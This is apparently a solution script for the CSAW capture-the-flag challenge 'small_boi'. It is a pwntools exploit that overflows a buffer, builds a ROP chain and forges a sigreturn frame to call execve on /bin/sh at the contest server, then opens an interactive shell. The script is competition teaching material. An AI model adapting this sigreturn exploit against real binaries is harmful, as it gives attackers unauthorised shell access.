from pwn import *
context.arch= 'amd64'
# p=process('./small_boi')
p=remote('pwn.chal.csaw.io',1002)

syscall_pop_ret = 0x0000000000400185

bin_sh = 0x004001ca

pop_rax_ret = 0x000000000040018a

payload = 'A'*40

payload += p64(pop_rax_ret) + p64(15)
payload += p64(syscall_pop_ret) 

frame = SigreturnFrame(kernel='amd64')
frame.rax = 59
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_pop_ret

payload+=str(frame)

p.sendline(payload)

p.interactive()
